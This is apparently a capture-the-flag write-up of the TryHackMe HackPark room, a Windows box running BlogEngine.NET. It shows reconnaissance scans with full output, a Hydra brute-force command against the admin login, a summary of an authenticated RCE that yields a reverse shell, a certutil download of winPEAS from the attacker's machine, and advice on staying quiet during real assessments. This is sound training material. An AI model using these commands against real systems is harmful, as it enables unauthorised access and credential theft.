---
title: "THM - HackPark without MetaSploit"
date: 2021-02-21
draft: true
categories: ["hacking", "write-ups"]
tags: [THM]
featuredImage: "/images/2021/02/HackPark_Logo.png"
---
## Intro

## Target
[THM - HackPark](https://tryhackme.com/room/hackpark)

## Recon
According to the preview picture of the video, we will face :

* Windows box ;
* Misc : Hydra, RCE, WinPEAS.

So, probably some credentials cracking with Hydra in order to get initial access, then an RCE to get limited shell, and finally `WinPEAS` to elevate our privileges to `SYSTEM`. Let's see!

## Enum
Let's run our nmap `scan`. Note that this time we had to add the `-Pn` switch :

```text
sudo nmap -T4 -A -p- -Pn -oA scan $target_ip
```
```text
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-21 09:25 CET
Nmap scan report for 10.10.144.161
Host is up (0.033s latency).
Not shown: 65533 filtered ports
PORT     STATE SERVICE            VERSION
80/tcp   open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| http-methods:
|_  Potentially risky methods: TRACE
| http-robots.txt: 6 disallowed entries
| /Account/*.* /search /search.aspx /error404.aspx
|_/archive /archive.aspx
|_http-server-header: Microsoft-IIS/8.5
|_http-title: hackpark | hackpark amusements
3389/tcp open  ssl/ms-wbt-server?
| ssl-cert: Subject: commonName=hackpark
| Not valid before: 2020-10-01T21:12:23
|_Not valid after:  2021-04-02T21:12:23
|_ssl-date: 2021-02-21T08:27:33+00:00; +3s from scanner time.
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2012 (89%)
OS CPE: cpe:/o:microsoft:windows_server_2012
Aggressive OS guesses: Microsoft Windows Server 2012 (89%), Microsoft Windows Server 2012 or Windows Server 2012 R2 (89%), Microsoft Windows Server 2012 R2 (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 2s

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   32.23 ms 10.11.0.1
2   32.53 ms 10.10.144.161

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 113.95 seconds
```

We discovered only two services :

* Web server on 80/tcp : Microsoft IIS 8.5
* RDP.

### Web scanning

Now, we'll run two longs scans, dedicated to websites. During those scans, we will manually browse to our website, with `Burp` proxy. I'll talk about this right below the scans output.

First scan :
```text
nikto -h http://10.10.144.161
```
```text
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.144.161
+ Target Hostname:    10.10.144.161
+ Target Port:        80
+ Start Time:         2021-02-21 09:29:23 (GMT1)
---------------------------------------------------------------------------
+ Server: Microsoft-IIS/8.5
+ Retrieved x-powered-by header: ASP.NET
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ Uncommon header 'content-script-type' found, with contents: text/javascript
+ Uncommon header 'content-style-type' found, with contents: text/css
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Entry '/search/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/search.aspx' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/archive/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/archive.aspx' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ "robots.txt" contains 6 entries which should be manually viewed.
+ Allowed HTTP Methods: GET, HEAD, OPTIONS, TRACE
+ Uncommon header 'x-aspnetwebpages-version' found, with contents: 3.0
+ OSVDB-3092: /archive/: This might be interesting...
+ OSVDB-3092: /archives/: This might be interesting...
+ 8705 requests: 0 error(s) and 15 item(s) reported on remote host
+ End Time:           2021-02-21 09:37:29 (GMT1) (486 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```
Second scan :

```text
gobuster dir -u http://10.10.144.161 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -t 200 -x .asp,aspx
```
```text
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.144.161
[+] Threads:        200
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     aspx,asp
[+] Timeout:        10s
===============================================================
2021/02/21 09:32:51 Starting gobuster
===============================================================
/blog.aspx (Status: 200)
/archives (Status: 200)
/archive (Status: 200)
/archive.aspx (Status: 200)
/search (Status: 200)
/search.aspx (Status: 200)
/content (Status: 301)
/page.aspx (Status: 302)
/default.aspx (Status: 200)
/admin (Status: 302)
/contact_us (Status: 200)
/contacts (Status: 200)
/contactus (Status: 200)
/contact (Status: 200)
/contact.aspx (Status: 200)
/account (Status: 301)
/post.aspx (Status: 302)
/scripts (Status: 301)
/contact-us (Status: 200)
/custom (Status: 301)
/contactinfo (Status: 200)
/setup (Status: 302)
/error.aspx (Status: 200)
/fonts (Status: 301)
/contact_off (Status: 200)
/searchresults (Status: 200)
/search_form (Status: 200)
/searchresultsbrief (Status: 200)
/searchtips (Status: 200)
/search2 (Status: 200)
/contact_form (Status: 200)
/contact_information (Status: 200)
/archive_query (Status: 200)
/searching (Status: 200)
/contactform (Status: 200)
/search-engines (Status: 200)
/contacto (Status: 200)
/search_left (Status: 200)
/search_results (Status: 200)
/searchengine (Status: 200)
/search_tips (Status: 200)
/contact-info (Status: 200)
/contact_sales (Status: 200)
/searchbutton (Status: 200)
/contact1 (Status: 200)
/search_off (Status: 200)
/searchcontent (Status: 200)
/search_engines (Status: 200)
/contacting (Status: 200)
/searchengines (Status: 200)
/search1 (Status: 200)
/search_help (Status: 200)
/search_right (Status: 200)
/search_engine (Status: 200)
/contact2 (Status: 200)
/searchform (Status: 200)
/searchhelp (Status: 200)
/search_close (Status: 200)
/search_icon (Status: 200)
/contact-me (Status: 200)
/archives2 (Status: 200)
/search-new (Status: 200)
/searches (Status: 200)
/contact_info (Status: 200)
/search3 (Status: 200)
/searchnav (Status: 200)
/contactus_off (Status: 200)
/archived (Status: 200)
/searchbox (Status: 200)
/search_btn (Status: 200)
/search_result (Status: 200)
/archive1 (Status: 200)
/search-tools (Status: 200)
/search-top (Status: 200)
/search_adv (Status: 200)
/searchtop (Status: 200)
/searchday (Status: 200)
/search_header (Status: 200)
/contact-off (Status: 200)
/search_attrib (Status: 200)
/search!default (Status: 200)
/contactgnw (Status: 200)
/searchproduct (Status: 200)
/search_2 (Status: 200)
/search_view (Status: 200)
/search_top (Status: 200)
/searchbar (Status: 200)
/search_advanced (Status: 200)
/search_getprod (Status: 200)
/search_windows (Status: 200)
/search_1 (Status: 200)
/searchtools (Status: 200)
/search_en (Status: 200)
/search_tools (Status: 200)
/search_button (Status: 200)
/contactsales (Status: 200)
/search-left (Status: 200)
/contactbutton (Status: 200)
/contactar (Status: 200)
/searchindex (Status: 200)
/contacttables (Status: 200)
/search-marketing (Status: 200)
/searchsite (Status: 200)
/search_nero (Status: 200)
/search_kaspersky (Status: 200)
/search_anydvd (Status: 200)
/search_tomtom (Status: 200)
/search_vista (Status: 200)
/contact_en (Status: 200)
/searchresult (Status: 200)
/search_for (Status: 200)
/search_head (Status: 200)
/search-tips (Status: 200)
/search_title (Status: 200)
/contactme (Status: 200)
/searchstandardra9 (Status: 200)
/search_site (Status: 200)
/contact_index (Status: 200)
/search_n (Status: 200)
/search-co (Status: 200)
/search_avi (Status: 200)
/contact_up (Status: 200)
/searchinform (Status: 200)
/search-right (Status: 200)
/search_advance (Status: 200)
/searchadv (Status: 200)
/searchcode (Status: 200)
/archive2 (Status: 200)
/searchfor (Status: 200)
/search_archives (Status: 200)
/search_rss (Status: 200)
/contact-tables (Status: 200)
/contact_editor (Status: 200)
/search_marketing (Status: 200)
/search_ (Status: 200)
/search_v2 (Status: 200)
/search_www (Status: 200)
/search_avast (Status: 200)
/archive-zip (Status: 200)
/search-engine (Status: 200)
/searchsecurity (Status: 200)
/searchleft (Status: 200)
/searchright (Status: 200)
/search_3 (Status: 200)
/search_nav (Status: 200)
/search_knowledge (Status: 200)
/contact-form (Status: 200)
/contactlist (Status: 200)
/contact-en (Status: 200)
/search_4 (Status: 200)
/contact_pair (Status: 200)
/archive2003 (Status: 200)
/search-adv (Status: 200)
/contact_list (Status: 200)
/archive_news (Status: 200)
/searcher (Status: 200)
/contact_management (Status: 200)
/searchicom (Status: 200)
/search_web (Status: 200)
/contact%20us (Status: 200)
/contact_tables (Status: 200)
/search-wy (Status: 200)
/search-me (Status: 200)
/search-wv (Status: 200)
/search-tx (Status: 200)
/search-nm (Status: 200)
/search-nj (Status: 200)
/search-id (Status: 200)
/search-ks (Status: 200)
/search-mi (Status: 200)
/search-ia (Status: 200)
/search-sc (Status: 200)
/search-ri (Status: 200)
/search-dc (Status: 200)
/search-tn (Status: 200)
/search-nh (Status: 200)
/search-mt (Status: 200)
/search-nv (Status: 200)
/search-vt (Status: 200)
/search-ok (Status: 200)
/search-pa (Status: 200)
/search-la (Status: 200)
/search-hi (Status: 200)
/search-fl (Status: 200)
/search-nc (Status: 200)
/search-ar (Status: 200)
/search-de (Status: 200)
/search-ak (Status: 200)
/search-al (Status: 200)
/search-ct (Status: 200)
/search-ca (Status: 200)
/search-sd (Status: 200)
/search-va (Status: 200)
/search-mo (Status: 200)
/search-ky (Status: 200)
/search-ma (Status: 200)
/search-mn (Status: 200)
/search-ms (Status: 200)
/search-ga (Status: 200)
/search-ut (Status: 200)
/search-wi (Status: 200)
/search-or (Status: 200)
/search-ny (Status: 200)
/search-md (Status: 200)
/search-in (Status: 200)
/search-il (Status: 200)
/search-az (Status: 200)
/search-oh (Status: 200)
/searchview (Status: 200)
/contact_button (Status: 200)
/search-16x16 (Status: 200)
/search_options (Status: 200)
/searchnews (Status: 200)
/search_go (Status: 200)
/contactoff (Status: 200)
/search_text (Status: 200)
/search_music (Status: 200)
/searchreg (Status: 200)
/contact_details (Status: 200)
/search_french (Status: 200)
/search_eragon (Status: 200)
/search_windows-vista (Status: 200)
/search_saw (Status: 200)
/search_porn (Status: 200)
/search_office-2007 (Status: 200)
/search_hentai (Status: 200)
/search_games (Status: 200)
/search_xxx (Status: 200)
/search_sex (Status: 200)
/contact-details (Status: 200)
/contactenos (Status: 200)
/archive_2006-m11 (Status: 200)
/contactusform (Status: 200)
/searchprofile!input (Status: 200)
/searchguide (Status: 200)
/search_index (Status: 200)
/search_avg (Status: 200)
/search-events (Status: 200)
/search_norton (Status: 200)
/search_spyware-doctor (Status: 200)
/search_sims (Status: 200)
/searchall (Status: 200)
/search-nd (Status: 200)
/search-wa (Status: 200)
/search-ne (Status: 200)
/search-ico (Status: 200)
/contact_main (Status: 200)
/contact_icon (Status: 200)
/search-icon (Status: 200)
/search_txt (Status: 200)
/archiver (Status: 200)
/search_blue (Status: 200)
/contact_call (Status: 200)
/archive2001 (Status: 200)
/archive2004 (Status: 200)
/search_bottom (Status: 200)
/search_jobs (Status: 200)
/contactus-off (Status: 200)
/search-bool (Status: 200)
/contact_title (Status: 200)
/contactus1 (Status: 200)
/searchwin2000 (Status: 200)
/search-inside (Status: 200)
/searchtype (Status: 200)
/searchout (Status: 200)
/search_city (Status: 200)
/search-cat (Status: 200)
/searchtool (Status: 200)
/contactbut (Status: 200)
/search_sweaw (Status: 200)
/search_dr (Status: 200)
/search_ediuspro4 (Status: 200)
/search_tweakmaster (Status: 200)
/search_msn (Status: 200)
/contact-lenses (Status: 200)
/search_office (Status: 200)
/archive2005 (Status: 200)
/searchhelppage (Status: 200)
/search_new (Status: 200)
/contact_head (Status: 200)
/contact_support (Status: 200)
/searchq (Status: 200)
/archive2006 (Status: 200)
/archive_2006-m03 (Status: 200)
/archive_2006-m02 (Status: 200)
/archive_2006-m04 (Status: 200)
/contact_new (Status: 200)
/contact_forms (Status: 200)
/search-1 (Status: 200)
/contact_top (Status: 200)
/search_label (Status: 200)
/contact_e (Status: 200)
/contacte (Status: 200)
/archive_search (Status: 200)
/searchx (Status: 200)
/archives_off (Status: 200)
/search-help (Status: 200)
/contactless (Status: 200)
/search97cgi (Status: 200)
/search_02 (Status: 200)
/search_01 (Status: 200)
/search-results (Status: 200)
/search_preteen (Status: 200)
/http%3a%2f%2fblog (Status: 200)
/http%3a%2f%2fblog.aspx (Status: 200)
/archive_2006-m08 (Status: 200)
/archive_2005-w16 (Status: 200)
/archive_2005-w14 (Status: 200)
/archive_2005-w18 (Status: 200)
/archive_2006-m12 (Status: 200)
/archive_2005-w23 (Status: 200)
/archive_2005-w43 (Status: 200)
/search-line (Status: 200)
/contactinformation (Status: 200)
/search_sm (Status: 200)
/searchbox_top (Status: 200)
/contact_offline (Status: 200)
/contact_www (Status: 200)
/contact_blog (Status: 200)
/contact_web (Status: 200)
/searchnetworking (Status: 200)
/search-en (Status: 200)
/contactcw (Status: 200)
/archives1 (Status: 200)
/search_winrar (Status: 200)
/search_nod32 (Status: 200)
/search_alcohol (Status: 200)
/contactussupport (Status: 200)
/archive02 (Status: 200)
/search_lockdown (Status: 200)
/contact_remove (Status: 200)
/searchbottom (Status: 200)
/searchlogo_dmoz (Status: 200)
/searchcloud (Status: 200)
/search_end (Status: 200)
/searchpro (Status: 200)
/search_6 (Status: 200)
/archivespg2 (Status: 200)
/contactu (Status: 200)
/contact_address (Status: 200)
/contact_reseller (Status: 200)
/contacttitle (Status: 200)
/contactmap_small (Status: 200)
/contactmap_large (Status: 200)
/contactmap_thumb (Status: 200)
/searchtitle (Status: 200)
/contact_on (Status: 200)
/contact_a (Status: 200)
/search_mnogosearch (Status: 200)
/archive_tar (Status: 200)
/archive_zip (Status: 200)
/archive2002 (Status: 200)
/archive2000 (Status: 200)
/search_packages (Status: 200)
/search_contents (Status: 200)
/search_search (Status: 200)
/contact_osdl (Status: 200)
/searchareaborder (Status: 200)
/contactvoa (Status: 200)
/search_on (Status: 200)
/search_srcheader (Status: 200)
/contact_addressbook (Status: 200)
/contact_secunia (Status: 200)
/searchhistory (Status: 200)
===============================================================
2021/02/21 09:36:17 Finished
===============================================================
```
Checking `searchsploit` for vuln on `IIS 8.5` won't reveal anything.

In the meantime, manual browsing to the website tells us it is a blog, and it is running on `BlogEngine.NET` which seems to be an Open source blogging platform for ASP / Windows platforms.

Using `searchsploit`, we'll discover that some versions are vulnerable to various stuff (including RCE), however we do not know yet, our version.

However, by looking at the source code of the main page, we'll see that we are using `BlogEngine 3.3.6.0` :

![HackPark Blog Version](/images/2021/02/HackPark_Blog_Version.png)

This confirms that our target is vulnerable to RCEs! By reading the RCEs on [Exploit-DB](https://www.exploit-db.com/), we see that all of them require access to the admin panel, they are Authenticated RCE. I guess, this is where `Hydra` will come useful and the `http://10.10.144.161/admin` URL we found during our previous scans.

### Cracking authentication with Burp
By reading the "Get Started with BlogEngine", we learn that default credentials are `admin` // `admin`. However, it doesn't work. We will assume that the password has been changed but not the user!

Before running `Hydra`, we need to gather URL parameter, I like to use `Burp` proxy history in order to do so :

![HackPark Proxy History Version](/images/2021/02/HackPark_Burp_History.png)

Then, I'll try to attack it like this :

```text
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.106.193 http-post-form "/Account/login.aspx?ReturnURL=%2fadmin:__VIEWSTATE=Q6%2Fwyy29Lyg61L12FTfXHvmaqgecBgtXUIRuiIVZJcFGpkb5tUJh93nSVJyuTgOfHtyLi9OgrKHFNl1seijcfd5djPWqvYuL6snvmS5V63eSntNGRbmzESEkm6ktoT2Dte8ynazWqXYY2eHuMMAEfJW605kE5c0VpnhTqNIq0L2E%2FkNX&__EVENTVALIDATION=gvR4CPW1DPVTT4Sm1GtfP5izsS5fJPp9bKo0SKI3XahFdVSdCQszWrKRTgWPFKxEICXK4t8lOn0TU0fheh7qDW4tv5IcHTzcIQ3ZVX8Mup8bVrtQVspuQDJhG%2B8j5lpl2zcnQjaPXY%2FfwjBMZou39tlG7J8yzxpVlOiY%2BkR3Vd0caNnr&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:F=Login failed" -vV
```
After a few seconds, with a good wordlist, it will find the password :

![HackPark Hydra Pass](/images/2021/02/HackPark_Hydra_Pass.png)

It is time to play with our Authenticated RCEs!

## Exploitation

### Getting initial shell
This [RCE](https://www.exploit-db.com/exploits/46353) seems to apply to our target and is well written, it explains step by step how to exploit it :

0. Setup `netcat` listner on our attacking box ;
1. We create a file called `PostView.ascx` and modify it with the IP and port of our attacking box ;
2. Upload it ;
3. Visit URL to trigger to remote shell.

And it worked :

![HackPark Initial Shell](/images/2021/02/HackPark_Initial_Shell.png)

Unfortunately, we are  not SYSTEM. Like we guessed during recon, we'll have to elevate our priv.

### PrivEsc

Let's get `WinPEAS` on our target. I like to use `winPEAS.bat` and upload via my own machine, serving it with Python module `SimpleHTTPServer`. Then, I'll download in on target with the following command:

```text
certutil -urlcache -f http://10.11.27.240/winPEAS.bat winPEAS.bat
```
NB : make sure to use a writable folder, such as: `C:\Users\Public`.

and we run it with :

```text
winPEAS.bat log
```
the `log` switch will save output to a log file and display it. Since we are training, there is no problem in saving the log in the remote machine. However, on a real assessment where you could have to hide you tracks, it might be better to simply print the log and copy it manually in order to save it outside the target. In any case, like with scanning tools, it is preferred to run the tool only once and save output. It will make you "quieter", which is want you probably want.

WinPEAS will reveal some `Administrator credentials` :

![HackPark Admin Pass](/images/2021/02/HackPark_Admin_Pass.png)

We try them in RDP, and boom! We are in :

![HackPark Admin RDP](/images/2021/02/HackPark_Admin_RDP.png)

Let's harvest our flags, first user :

![HackPark User Flag](/images/2021/02/HackPark_User_Flag.png)

Then root:

![HackPark Root Flag](/images/2021/02/HackPark_Root_Flag.png)


## Outro